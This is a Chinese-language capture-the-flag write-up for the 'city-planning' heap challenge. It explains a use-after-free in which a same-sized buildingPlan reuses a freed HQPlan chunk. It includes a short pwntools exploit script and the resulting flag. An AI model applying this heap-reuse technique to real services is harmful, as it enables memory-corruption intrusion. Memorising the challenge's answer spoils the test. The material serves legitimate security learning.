# city-planning

## 题目简述

程序先在堆上分配一个 `HQPlan`，随后调用 `approveHQ`。总部坐标被初始化到 50–199，而审批条件要求坐标小于 50，因此该对象一定会被 `free`；主函数却继续保留 `superSecretHQ` 悬空指针。接着分配的 `buildingPlan` 与 `HQPlan` 都是 44 字节，malloc 会复用同一尺寸的空闲块，形成稳定的 use-after-free 类型混淆。

## 解题过程

两个结构体对同一块内存的解释如下：

```text
HQPlan:       numAcres[0:4] | coordinates[0][4:8] | coordinates[1][8:12] | ...
buildingPlan: name[0:32]    | numAcres[32:36]      | coordinates[36:44]
```

因此新建筑的 `name` 前 12 字节恰好覆盖悬空总部对象的面积和两个坐标。把它们都写成小端整数 1，之后再给建筑本身的面积与坐标输入 1，使 `approvePlan` 通过。最终猜测总部坐标 `1,1`，读取的正是已被名字覆盖的悬空对象。

```python
from pwn import p32, remote

io = remote("challenge-host", 12345)

# HQPlan 的 numAcres、x、y 都被覆盖为 1。
io.sendlineafter(b"building: ", p32(1) * 3)

# buildingPlan 的面积、x、y，以及最后的总部 x、y 猜测。
for _ in range(5):
    io.sendlineafter(b": ", b"1")

print(io.recvall().decode(errors="replace"))
```

服务输出：

```text
tjctf{a_tru3_4rchit3ct_2erg4b5}
```

## 方法总结

- 核心技巧：利用相同堆尺寸导致的立即复用，让新对象字段覆盖悬空旧对象的敏感字段。
- 识别信号：函数内部 `free(plan)` 只把局部形参置空，调用方仍继续使用原指针；随后又分配同尺寸结构体。
- 复用要点：先画出两种结构布局并计算字段偏移，再选择同时满足新对象校验与旧对象目标值的数据。
